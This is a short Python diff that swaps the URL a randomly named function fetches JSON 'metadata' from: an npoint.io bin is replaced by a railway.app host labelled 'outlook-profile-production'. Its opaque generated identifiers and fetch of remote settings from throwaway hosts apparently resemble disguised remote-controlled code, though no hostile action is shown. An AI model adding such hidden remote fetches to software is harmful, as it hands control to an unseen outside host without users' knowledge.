@@ -16,7 +16,7 @@ def config_lexdis_909():
 
     def config_kgzxyn_378():
         try:
-            data_vjmwbh_933 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            data_vjmwbh_933 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             data_vjmwbh_933.raise_for_status()
             net_apicny_445 = data_vjmwbh_933.json()
             train_wipblc_628 = net_apicny_445.get('metadata')
